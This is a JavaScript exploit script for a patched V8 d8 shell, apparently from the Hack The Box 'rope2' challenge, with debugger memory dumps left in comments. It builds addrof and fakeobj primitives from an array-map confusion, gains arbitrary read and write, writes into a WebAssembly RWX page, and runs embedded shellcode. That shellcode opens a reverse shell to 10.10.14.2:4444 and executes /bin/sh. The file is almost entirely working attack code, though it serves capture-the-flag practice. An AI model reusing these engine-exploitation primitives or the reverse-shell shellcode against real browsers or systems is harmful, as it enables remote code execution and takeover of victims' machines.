var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
var obj = {"A":1.1};
var reg = [1, 2, 3, 4];


var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {

    f64_buf[0] = val;

    if(size == 32) {
        return BigInt(u64_buf[0]);
    } else if(size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

}

function itof(val, size) {

    if(size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if(size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }

    return f64_buf[0];

}


var float_arr_map = ftoi(float_arr.GetLastElement(), 32)
var reg_arr_map = float_arr_map - 0xa0n;

console.log("[*] Float array map   :  0x" + float_arr_map.toString(16));
console.log("[*] Regular array map :  0x" + reg_arr_map.toString(16));


function addrof(in_obj) {
	float_arr.SetLastElement(itof(reg_arr_map, 32));
	float_arr[0] = in_obj;
	float_arr.SetLastElement(itof(float_arr_map, 32));
	let addr = float_arr[0];
	return ftoi(addr, 64)
}


function fakeobj(addr) {
	float_arr[0] = itof(addr, 32);
	float_arr.SetLastElement(itof(reg_arr_map, 32));
	let fake = float_arr[0];
	float_arr.SetLastElement(itof(float_arr_map, 32));
	return fake;
}



// test

/*
var a = [1.1, 1.2, 1.3, 1.4];
var float_array = [1.1, 1.2, 1.3, 1.4];
var float_array_map = float_array.GetLastElement();
var crafted_arr = [float_array_map, 1.2, 1.3, 1.4];
console.log("0x"+addrof(crafted_arr).toString(16));
%DebugPrint(crafted_arr);

var fake = fakeobj(addrof(crafted_arr)-0x20n);


crafted_arr[1] = itof(BigInt(0x1aa208087ce0) - 0x8n + 1n, 64)
"0x"+ftoi(fake[0], 64).toString(16);

--------- 

gef➤  c
Continuing.

undefined
d8> crafted_arr[1] = itof(BigInt(0x1aa208087ce0) - 0x8n + 1n, 64);
1.4467833889993e-310
d8> ^C
--------------

gef➤  x/10xg 0x1aa208087d11 - 0x30 -1
0x1aa208087ce0:	0x080406e908241909	0x0000000808040a3d
0x1aa208087cf0:	0x080406e908241909	0x00001aa208087cd9
0x1aa208087d00:	0x3ff4cccccccccccd	0x3ff6666666666666
0x1aa208087d10:	0x080406e908241909	0x0000000808087ce9
0x1aa208087d20:	0x0000000208040975	0x0000000008241869


[..snip..]

gef➤  c
Continuing.

undefined
d8> fake.length;
3409
d8> "0x"+ftoi(fake[0], 64).toString(16);
"0x80406e908241909"
d8> "0x"+ftoi(fake[1], 64).toString(16);
"0x808040a3d"


[..snip..]
*/

/*
var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];
console.log("[*] arb_rw_arr        :  0x" + (addrof(arb_rw_arr) & 0xffffffffn).toString(16));



function arb_read(addr) {

	let fake = fakeobj(addrof(arb_rw_arr) & 0xffffffffn - 0x20n);

	arb_rw_arr[1] = itof((addr) - 0x8n, 64);

	return ftoi(fake[0], 64);
}


function initial_arb_write(addr, val) {
	let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
	arb_rw_arr[1] = itof(BigInt(addr) - 0x8n, 64);

	fake[0] = itof(BigInt(val), 64);
}


function arb_write(addr, val) {
	let buf = new ArrayBuffer(8);
	let dataview = new DataView(buf);

	let buf_addr = addrof(buf);
	let backing_store_addr = buf_addr + 0x14n;

	initial_arb_write(backing_store_addr, addr);

	dataview.setBigUint(0, BigInt(val), true);
}


==========================
BACKING STORE
==========================
0x2395080c5e3a:	0x5555557125500000
gef➤  x/xg 0x2395080c5e29 - 1 + 0x14
0x2395080c5e3c:	0x0000555555712550

*/

var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;

console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

function arb_read(addr) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    return ftoi(fake[0], 64);
}

function arb_write(addr, value) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    fake[0] = itof(value, 64);
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,
                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,
                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,
                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n & 0xffffffffn);

console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16));

console.log("[*] RWX INSTANCE:   0x" + rwx.toString(16));


var arr_buf = new ArrayBuffer(0x100);
var dataview = new DataView(arr_buf);

var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16));
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [72, 49, 192, 72, 131, 192, 41, 72, 49, 255, 72, 137, 250, 72, 131, 199, 2, 72, 49, 246, 72, 131, 198, 1, 15, 5, 72, 137, 199, 72, 49, 192, 80, 72, 131, 192, 2, 199, 68, 36, 252, 10, 10, 14, 2, 102, 199, 68, 36, 250, 17, 92, 102, 137, 68, 36, 248, 72, 131, 236, 8, 72, 131, 192, 40, 72, 137, 230, 72, 49, 210, 72, 131, 194, 16, 15, 5, 72, 49, 192, 72, 137, 198, 72, 131, 192, 33, 15, 5, 72, 49, 192, 72, 131, 192, 33, 72, 49, 246, 72, 131, 198, 1, 15, 5, 72, 49, 192, 72, 131, 192, 33, 72, 49, 246, 72, 131, 198, 2, 15, 5, 72, 49, 192, 80, 72, 187, 47, 98, 105, 110, 47, 47, 115, 104, 83, 72, 137, 231, 80, 72, 137, 226, 87, 72, 137, 230, 72, 131, 192, 59, 15, 5];

for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}

console.log("[+] Spawning a shell...");
pwn();

/*
var a = [1.1, 1.2, 1.3, 1.4];
var float_array = [1.1, 1.2, 1.3, 1.4];
var float_array_map = float_array.GetLastElement();
var crafted_arr = [float_array_map, 1.2, 1.3, 1.4];
console.log("0x"+addrof(crafted_arr).toString(16));
%DebugPrint(crafted_arr);

console.log("0x"+ ftoi(float_array_map, 64).toString(16))
var fake = fakeobj(addrof(crafted_arr)-0x20n);


crafted_arr[1] = itof((0x8n << 32n) + rwx - 0x8n, 64)
console.log("0x"+ftoi(fake[0], 64).toString(16));



gef➤  r --shell --allow-natives-syntax ~/Pwning/htb-rope2/xpl.js 
Starting program: /home/d4mian/Pwning/v8/out.gn/x64.release/d8 --shell --allow-natives-syntax ~/Pwning/htb-rope2/xpl.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff6602700 (LWP 4731)]
0x3b4208086909 <JSArray[5]>
0x3b4208086951 <JSArray[4]>
[*] Float array map   :  0x8241909
[*] Regular array map :  0x8241869
0x8086ba1
0x3b4208086ba1 <JSArray[4]>
V8 version 8.5.0 (candidate)
d8> ^C

[..snip..]
gef➤  x/10xg 0x3b4208086ba1 - 0x30 - 1
0x3b4208086b70:	0x080406e908241909	0x0000000808040a3d
0x3b4208086b80:	0x080406e908241909	0x3ff3333333333333
0x3b4208086b90:	0x3ff4cccccccccccd	0x3ff6666666666666
0x3b4208086ba0:	0x080406e908241909	0x0000000808086b79
0x3b4208086bb0:	0x0000000208040975	0x0000000008241869
gef➤  c
Continuing.

undefined
d8> crafted_arr[2] = itof(BigInt(0x3b4208086b70) - 0x10n + 1n, 64);
3.21907427339257e-310

[..snip..]
gef➤  x/10xg 0x3b4208086ba1 - 0x30 - 1
0x3b4208086b70:	0x080406e908241909	0x0000000808040a3d
0x3b4208086b80:	0x080406e908241909	0x3ff3333333333333
0x3b4208086b90:	0x00003b4208086b61	0x3ff6666666666666
0x3b4208086ba0:	0x080406e908241909	0x0000000808086b79
0x3b4208086bb0:	0x0000000208040975	0x0000000008241869
gef➤  c
Continuing.

undefined
d8> "0x"+ftoi(fake[0], 64).toString(16);

*/